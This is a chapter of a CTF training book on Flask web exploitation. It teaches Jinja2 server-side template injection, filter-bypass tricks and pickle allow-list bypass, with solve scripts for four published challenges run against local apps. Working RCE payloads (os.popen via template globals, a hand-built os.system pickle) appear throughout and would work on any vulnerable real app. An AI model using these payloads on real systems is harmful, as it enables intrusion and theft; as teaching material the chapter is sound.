# Chapter 9 — Web: Flask, SSTI, and Pickle Deserialization

Web challenges hand you a running app and ask you to make it misbehave. Two bugs
dominate Python web CTFs:

- **SSTI** (Server-Side Template Injection): your input reaches a Jinja2 template
  and gets *evaluated*.
- **Insecure deserialization**: the `pickle`-is-code-execution bug from
  [Chapter 8](08-pyjail.md), now over HTTP.

This chapter drives apps with `requests`, grows the SSTI half of `ctfkit.web`,
and solves four real apps on 127.0.0.1. It builds on the
[Chapter 8](08-pyjail.md) pickle builder and the service-automation mindset from
[Chapter 3](03-talking-to-services.md).

## Talking to web apps with `requests`

[`requests`](https://requests.readthedocs.io/) is the practitioner HTTP tool. A
`Session` keeps cookies across calls; `params=` builds the query string;
`cookies=`/`headers=` set what you send. We run a throwaway Flask app on
127.0.0.1 in a background thread and talk to it — never a remote host.

`examples/ch09/requests_basics.py`

```python
import threading, time, requests
from flask import Flask, request
from werkzeug.serving import make_server

app = Flask(__name__)

@app.route("/echo")
def echo():
    return f"you sent name={request.args.get('name')}"

@app.route("/setcookie")
def setcookie():
    resp = app.make_response("cookie set")
    resp.set_cookie("token", "s3cr3t")
    return resp

@app.route("/whoami")
def whoami():
    return f"token={request.cookies.get('token')}"

srv = make_server("127.0.0.1", 8071, app)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.5)
try:
    s = requests.Session()
    print(s.get("http://127.0.0.1:8071/echo", params={"name": "ctf"}).text)
    s.get("http://127.0.0.1:8071/setcookie")
    print("session cookies:", s.cookies.get_dict())
    print(s.get("http://127.0.0.1:8071/whoami").text)
finally:
    srv.shutdown()
```

```console
$ python examples/ch09/requests_basics.py
you sent name=ctf
session cookies: {'token': 's3cr3t'}
token=s3cr3t
```

The `Session` captured the `Set-Cookie` from `/setcookie` and resent it to
`/whoami` on its own — exactly what login-gated challenges need.

> **Flask is a per-challenge extra.** It is not in the core `requirements.txt`.
> Install it when you reach this chapter: `pip install flask`. The apps below
> run locally on 127.0.0.1.

## SSTI: confirming the bug

If user input reaches `render_template_string`, Jinja2 evaluates it. The tell:
`{{7*7}}` returns `49`, not the literal text. `ctfkit.web.ssti_probes` returns a
family of probes; different engines answer differently, which fingerprints
them.

`examples/ch09/ssti_confirm.py`

```python
import threading, time, requests
from flask import Flask, render_template_string, request
from werkzeug.serving import make_server
from ctfkit.web import ssti_probes

app = Flask(__name__)

@app.route("/render")
def render():
    return render_template_string(request.args.get("q", ""))

srv = make_server("127.0.0.1", 8072, app)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.5)
try:
    for probe in ssti_probes():
        r = requests.get("http://127.0.0.1:8072/render",
                         params={"q": probe}, timeout=5)
        print(f"{probe!r:30} -> {r.text!r}")
finally:
    srv.shutdown()
```

```console
$ python examples/ch09/ssti_confirm.py
'{{7*7}}'                      -> '49'
'${7*7}'                       -> '${7*7}'
'#{7*7}'                       -> '#{7*7}'
"{{7*'7'}}"                    -> '7777777'
'{% raw %}x{% endraw %}'       -> 'x'
```

`{{7*7}}` → `49` and `{{7*'7'}}` → `7777777` confirm **Jinja2**. The `${7*7}`
and `#{7*7}` forms come back unchanged, ruling out Twig/Freemarker-style
engines. `{% raw %}` proves statement tags work too — handy when `{{ }}` is
filtered.

## SSTI: escalating to RCE

Once evaluation is confirmed, reach `os` through any Jinja2 global that exposes
`__globals__`. `ctfkit.web.ssti_rce_payload` builds the
`cycler.__init__.__globals__.os.popen(cmd).read()` chain.

`examples/ch09/ssti_rce.py`

```python
from ctfkit.web import ssti_rce_payload
# ... app with /render as above, on port 8073 ...
payload = ssti_rce_payload("id")
print("payload:", payload)
r = requests.get("http://127.0.0.1:8073/render", params={"q": payload}, timeout=5)
print("server ran `id` ->", r.text.strip())
```

```console
$ python examples/ch09/ssti_rce.py
payload: {{ cycler.__init__.__globals__.os.popen('id').read() }}
server ran `id` -> uid=1000(you) gid=1000(you) groups=1000(you),...
```

The server executed `id` and returned its output. Swap `id` for `cat flag.txt`
and the flag comes straight back. (The exact `id` output depends on the
machine.)

### Why `cycler`? The Jinja2 globals

Jinja2 exposes a few harmless-looking globals in every template: `cycler`,
`lipsum`, `range`, `dict`, `namespace`, plus the Flask extras `request`,
`config`, `url_for`. Each is a Python object, so each has `__init__.__globals__`
— the module dict of the file that defines it, which imports `os`. You need only
*one* reachable global. The shortest names (`lipsum`, `cycler`) win under a
length limit.

## Filter-bypass SSTI

Challenges blacklist `_`, `[`, `]`, `{{` to block `__globals__` and
subscripting. Jinja2 has bracket-free equivalents:

- `a|attr(name)` instead of `a[name]` or `a.name`
- `{% set %}` statement tags instead of `{{ }}`
- `request.args` to smuggle forbidden strings in as query parameters

`examples/ch09/ssti_bypass.py`

```python
# app blocks "_", "[", "]" in the template, on port 8074
payload = "{{(cycler.next|attr(request.args.g)).os.popen(request.args.c).read()}}"
print("template passes blacklist:", not any(b in payload for b in ["_", "[", "]"]))
r = requests.get("http://127.0.0.1:8074/render",
                 params={"q": payload, "g": "__globals__", "c": "echo bypassed"},
                 timeout=5)
print("result:", r.text.strip())
```

```console
$ python examples/ch09/ssti_bypass.py
template passes blacklist: True
result: bypassed
```

The banned word `__globals__` never appears in the template — it rides in as
`request.args.g`, and `|attr` dereferences it. This is the single most useful
SSTI trick for filtered challenges.

## Pickle over HTTP

The same `pickle` bug from [Chapter 8](08-pyjail.md) shows up in web apps that
accept a serialized blob (often base64) and `pickle.loads` it — session cookies,
"import/export" features, message queues. Different surface, same fix: never
unpickle untrusted data. We reuse the `ctfkit.web.pickle_opcode_rce` builder
from [Chapter 8](08-pyjail.md) for the `were-pickle-phreaks` solve below,
hand-assembling a `STACK_GLOBAL` + `REDUCE` stream that slips past an import
allow-list.

## Building ctfkit: `web` (SSTI part)

`ctfkit.web` gains two SSTI helpers on top of [Chapter 8](08-pyjail.md)'s pickle
builders.

`project/ch09/ctfkit/web.py` (added functions)

```python
def ssti_probes() -> list[str]:
    """Return template payloads that confirm (and fingerprint) SSTI."""
    return ["{{7*7}}", "${7*7}", "#{7*7}", "{{7*'7'}}", "{% raw %}x{% endraw %}"]


def ssti_rce_payload(command: str, var: str = "x") -> str:
    """Build a Jinja2 SSTI payload that runs ``command`` and prints its output."""
    return (
        "{{ cycler.__init__.__globals__.os.popen(%r).read() }}" % command
    )
```

`ssti_probes` is your confirm-and-fingerprint step; `ssti_rce_payload` is the
default-Flask escalation. Both are tiny on purpose, so you can tweak them inline
when a challenge filters a character.

### Checkpoint

```console
$ cd project/ch09 && pytest -q
.........................                                                [100%]
25 passed in 0.06s
```

The complete project at this point is in `project/ch09/`.

## Challenge walkthrough: parrot-the-emu

> Challenge: **parrot-the-emu** — DownUnderCTF 2024 by the DUCTF organisers.
> Source: `DownUnderCTF/Challenges_2024_Public@f2797a33d8`
> (`beginner/parrot-the-emu`). License: none (organizer-published for practice).

### Recon

```console
$ python challenges/fetch.py parrot-the-emu
$ ls challenges/parrot-the-emu/src/main-app
app.py  flag  requirements.txt  static  templates
$ sed -n '1,16p' challenges/parrot-the-emu/src/main-app/app.py
```

```python
@app.route('/', methods=['GET', 'POST'])
def vulnerable():
    if request.method == 'POST':
        user_input = request.form.get('user_input')
        result = render_template_string(user_input)   # <-- the bug
        chat_log.append(('Emu', result))
    return render_template('index.html', chat_log=chat_log)
```

The emu "parrots" your input back by feeding it straight to
`render_template_string`. No filter at all.

### Clues

> **Clue:** input is reflected into a *template*, not just HTML. `{{7*7}}`
> rendering `49` confirms SSTI.

> **Clue:** the app binds port **80** (`app.run(debug=True, port=80)`). Running
> locally we import its `app` object and bind a high port on 127.0.0.1 instead,
> so we don't need privileges.

Clue → hypothesis: plain, unfiltered SSTI — the textbook `__globals__` chain
reads the flag file, parroted straight back.

### Solve

`examples/ch09/solve_parrot_the_emu.py` launches the app on 127.0.0.1:8099 and
POSTs the RCE payload:

```python
PORT = 8099
PAYLOAD = '{{cycler.next.__globals__.os.popen("cat flag").read()}}'
# ... start app on 127.0.0.1:PORT ...
r = requests.post(f"http://127.0.0.1:{PORT}/",
                  data={"user_input": PAYLOAD}, timeout=5)
match = re.search(r"DUCTF\{[^}]*\}", r.text)
print("FLAG:", match.group(0) if match else "not found")
```

```console
$ python examples/ch09/solve_parrot_the_emu.py
FLAG: DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}
```

### Why it worked / generalize

The bug class is **reflected SSTI**. Any `render_template_string(user_input)` —
or an f-string/`%`-format that builds a template from user data — is RCE. The
reflex: confirm with `{{7*7}}`, then walk a global's `__globals__` to `os`.

## Challenge walkthrough: minigolf

> Challenge: **minigolf** — ImaginaryCTF 2022 by the ICTF organisers. Source:
> `ImaginaryCTF/ImaginaryCTF-2022-Challenges@ac2f0aa796` (`Web/minigolf`).
> License: none (organizer-published for practice).

### Recon

```console
$ python challenges/fetch.py minigolf
$ sed -n '1,18p' challenges/minigolf/challenge/app/app.py
```

```python
blacklist = ["{{", "}}", "[", "]", "_"]
if "txt" in request.args.keys():
    txt = html.escape(request.args["txt"])
    if any([n in txt for n in blacklist]):
        return "Not allowed."
    if len(txt) <= 69:
        return render_template_string(txt)
```

SSTI, but `{{`, `}}`, `[`, `]`, `_` are banned and the template is capped at 69
characters. Classic "golfed" filter-bypass.

### Clues

> **Clue:** no `{{ }}` and no `_` means no `{{ __globals__ }}`. Use `{% set %}`
> statement tags and `|attr` for attribute access.

> **Clue:** the forbidden strings (`__globals__`, the shell command) can be
> smuggled in through `request.args` and referenced as `a.g` / `a.c` — attribute
> access dodges `_` and `[]`.

Clue → hypothesis: build the whole chain from statement tags +
`request.args` indirection, and exfiltrate the flag to the server's own stderr
so we can read it locally.

### Test the hypothesis

`os.popen` pipes only **stdout**, but the server process inherits **fd 2**. So
`cat flag.txt 1>&2` writes the flag to the server's stderr, which we capture
locally — no out-of-band webhook needed (the original author used one; we stay
local).

### Solve

`examples/ch09/solve_minigolf.py` launches the app, fires the bracket-free
payload with the banned strings in query args, and greps the flag from the
server's stderr:

```python
PAYLOAD = "{%set a=request.args%}{%set b=(cycler.next|attr(a.g)).os.popen(a.c)%}"
requests.get("http://127.0.0.1:1337/",
             params={"txt": PAYLOAD, "g": "__globals__", "c": "cat flag.txt 1>&2"})
# ... read the server subprocess's stderr, regex the flag ...
```

```console
$ python examples/ch09/solve_minigolf.py
FLAG: ictf{whats_in_the_flask_tho}
```

### Why it worked / generalize

The bug class is **Jinja2 SSTI with a filter bypass**. `|attr(name)` and
`{% set %}` replace every bracket and dunder the blacklist removed, and
`request.args` smuggles any string the template itself may not contain. Read the
blacklist, then route around each entry — a skill shared with pyjails
([Chapter 8](08-pyjail.md)).

## Challenge walkthrough: sstigolf

> Challenge: **sstigolf** — ImaginaryCTF 2022 by the ICTF organisers. Source:
> `ImaginaryCTF/ImaginaryCTF-2022-Challenges@ac2f0aa796` (`Web/sstigolf`).
> License: none (organizer-published for practice).

### Recon

```console
$ python challenges/fetch.py sstigolf
$ ls challenges/sstigolf/challenge/app
an_arbitrarily_named_file  app.py  run.sh  truly_an_arbitrarily_named_file
$ sed -n '1,20p' challenges/sstigolf/challenge/app/app.py
```

```python
@app.route('/ssti')
def ssti():
    query = request.args['query'] if 'query' in request.args else '...'
    if len(query) > 48:
        return "Too long!"
    return render_template_string(query)
```

No character blacklist this time — the only rule is `len(query) <= 48`. The flag
lives in an oddly named file (`an_arbitrarily_named_file`), so you can't `cat`
it by name within the limit.

### Clues

> **Clue:** with `{{ }}` allowed, you can render output directly — no out-of-band
> exfil needed.

> **Clue:** the weird filenames mean `cat *` is shorter and reads them all. The
> shortest global with `__globals__` is `lipsum`.

Clue → hypothesis: `{{lipsum.__globals__.os.popen("cat *").read()}}` — count the
characters and make it fit.

### Test the hypothesis

```text
{{lipsum.__globals__.os.popen("cat *").read()}}   # 47 chars <= 48 ✓
```

47 characters, under the 48 limit, and `cat *` dumps every file in the app
directory into the response.

### Solve

`examples/ch09/solve_sstigolf.py`:

```python
PAYLOAD = '{{lipsum.__globals__.os.popen("cat *").read()}}'  # 47 chars
assert len(PAYLOAD) <= 48
r = requests.get("http://127.0.0.1:1337/ssti", params={"query": PAYLOAD}, timeout=5)
match = re.search(r"ictf\{[^}]*\}", r.text)
print("FLAG:", match.group(0) if match else "not found")
```

```console
$ python examples/ch09/solve_sstigolf.py
FLAG: ictf{F!1+3r5s!?}
```

### Why it worked / generalize

The bug class is **minimal-length SSTI**. A length cap only forces shorter
payloads; it never stops SSTI. Keep a mental list of the shortest primitives:
`lipsum.__globals__.os`, `cat *` to dodge unknown filenames, and direct `{{ }}`
rendering when it's allowed.

## Challenge walkthrough: were-pickle-phreaks

> Challenge: **Were Pickle Phreaks** — HTB Cyber Apocalypse 2024 by HackTheBox.
> Source: `hackthebox/cyber-apocalypse-2024@4e59eec7a4`
> (`misc/[Easy] Were Pickle Phreaks`). License: none (HTB official write-up
> repo). The repo ships only the write-up; reconstruct `app.py` + `sandbox.py`
> from its code fences to run it locally.

### Recon

```console
$ python challenges/fetch.py were-pickle-phreaks
$ ls challenges/were-pickle-phreaks
README.md  htb/  __pycache__/
```

This is a *write-up* repo, not a source archive. The `README.md` embeds `app.py`
and `sandbox.py` as fenced code blocks. Copy them into
`challenges/were-pickle-phreaks/app.py` and `sandbox.py` (plus a local
`flag.txt`) so you can run it yourself. The security-critical part is the
sandbox:

```python
ALLOWED_PICKLE_MODULES = ['__main__', 'app']
UNSAFE_NAMES = ['__builtins__']

class RestrictedUnpickler(_pickle.Unpickler):
    def find_class(self, module, name):
        if (module in ALLOWED_PICKLE_MODULES
                and not any(name.startswith(f"{name_}.") for name_ in UNSAFE_NAMES)):
            return super().find_class(module, name)
        raise _pickle.UnpicklingError()
```

The app lets you register a base64 pickle blob (menu option 2) and later
unpickles it to display members (option 1).

### Clues

> **Clue:** the allow-list is on the **module**, not on what that module can
> reach. `app` imports `random` (`import random` at the top of `app.py`).

> **Clue:** `random._os` *is* the real `os` module. So the global
> `app` / `random._os.system` passes `module in ['__main__','app']`, is not
> blocked by the `__builtins__.` prefix check, yet resolves to `os.system`.

Clue → hypothesis: hand-assemble a proto-4 pickle whose `STACK_GLOBAL` picks
`app` + `random._os.system` and whose `REDUCE` calls it with `cat flag.txt`.

### Test the hypothesis

`find_class('app', 'random._os.system')` runs `getattr` chains from module `app`:
`app.random` → the `random` module → `random._os` → `os` → `os.system`. Every
hop is an attribute lookup the allow-list never inspects. `pickletools.dis` on
the crafted blob shows a single `STACK_GLOBAL` and `REDUCE` — no forbidden
module name anywhere.

### Solve

`examples/ch09/solve_were_pickle_phreaks.py` builds the pickle by hand (reusing
the opcode approach from [Chapter 8](08-pyjail.md)), base64-encodes it, and
drives the local app's menu:

```python
def global_call_pickle(module, qualname, arg):
    return (b"\x80\x04"
            b"\x8c" + bytes([len(module)]) + module +
            b"\x8c" + bytes([len(qualname)]) + qualname +
            b"\x93"                                   # STACK_GLOBAL
            b"\x8c" + bytes([len(arg)]) + arg +
            b"\x85R.")                                # TUPLE1 REDUCE STOP

payload = global_call_pickle(b"app", b"random._os.system", b"cat flag.txt")
blob = base64.b64encode(payload)
stdin = b"2\n" + blob + b"\n1\n3\n"   # register, then view (triggers unpickle)
```

```console
$ python examples/ch09/solve_were_pickle_phreaks.py
FLAG: HTB{54N17121N9_MODul3_4Nd_No7_n4M3_15_4_5UR3_w4y_7o_937_1n7o_4_p1cKL3_d4y}
```

### Why it worked / generalize

The bug class is **allow-list-bypass pickle RCE**. Filtering the *module name* is
not enough: if an allowed module imports anything, every one of its attributes is
reachable through dotted `getattr`. The flag text spells out the lesson —
sanitising the **module** and not the **name** is a sure way to get popped. Treat
any `pickle.loads` of client data as RCE, whatever the wrapper.

## Summary

- Drive web challenges with `requests`: a `Session` carries cookies, `params=`
  builds the query string. Run apps **locally** on 127.0.0.1.
- **SSTI**: `render_template_string(user_input)` evaluates your input. Confirm
  with `{{7*7}}` → `49` (`ctfkit.web.ssti_probes`), then reach `os` through any
  global's `__globals__` (`ctfkit.web.ssti_rce_payload`).
- **Filter bypass**: `|attr(name)` replaces `[...]`/`.name`, `{% set %}` replaces
  `{{ }}`, and `request.args` smuggles banned strings. Length caps only force
  shorter payloads (`lipsum.__globals__.os`, `cat *`).
- **Pickle over HTTP** is the [Chapter 8](08-pyjail.md) bug on a new surface.
  Allow-listing the *module* fails when that module imports others — dotted
  `getattr` reaches them.

## Exercises

1. **Fingerprint an engine.** Point `ssti_probes()` at a `render_template_string`
   app and explain what `{{7*7}}` → `49` versus `${7*7}` → `${7*7}` tells you.

   <details><summary>Solution</summary>

   `{{7*7}}` evaluating proves a Jinja2-family engine (Flask). `${7*7}` and
   `#{7*7}` returning unchanged rule out Twig/Freemarker/Ruby ERB-style engines,
   so you target the Jinja2 `__globals__` chain rather than a different syntax.
   </details>

2. **Shorten the payload.** Rewrite `{{cycler.__init__.__globals__.os.popen("id").read()}}`
   to fit in 48 characters. Which global is shortest?

   <details><summary>Solution</summary>

   `{{lipsum.__globals__.os.popen("id").read()}}` — `lipsum` exposes
   `__globals__` directly (no `.__init__`), so it is the shortest route. For
   `cat *` the full payload is 47 chars (see `solve_sstigolf.py`).
   </details>

3. **Bracket-free attribute access.** Without `[`, `]`, or `_` in the template,
   write a Jinja2 expression that reaches `__globals__` using `request.args` and
   `|attr`. (See `examples/ch09/ssti_bypass.py`.)

   <details><summary>Solution</summary>

   `{{(cycler.next|attr(request.args.g)).os.popen(request.args.c).read()}}` with
   `g=__globals__` and `c=<command>` passed as query parameters. The banned
   strings live in the URL, never in the template.
   </details>

4. **Pickle allow-list hole.** Given a `RestrictedUnpickler` that allows module
   `app`, and `app` does `import random`, name a dotted global that resolves to
   `os.system`. Why does the module allow-list miss it?

   <details><summary>Solution</summary>

   `random._os.system`: `random` imports `os` as `_os`, so `app.random._os` is
   the real `os`. The check only compares the *module* string (`app`) against
   the allow-list and never inspects the dotted *name*, so every attribute hop
   after it is unguarded.
   </details>

5. **Stretch — were-pickle-phreaks-revenge.** The "Revenge" variant tightens the
   filter. Fetch it, reconstruct its source from the write-up, and find which
   opcodes/attributes remain reachable under the stricter allow-list.

   <details><summary>Solution sketch</summary>

   Same deserialization clue, narrower allow-list. Enumerate the still-allowed
   modules and walk their imports with dotted `getattr` to find another path to
   a dangerous callable; craft the `STACK_GLOBAL` + `REDUCE` stream accordingly.
   The technique is identical — only the reachable name changes.
   </details>

Sources for this chapter: [REFERENCES.md](REFERENCES.md#chapter-9--web-flask-ssti-and-pickle-deserialization)
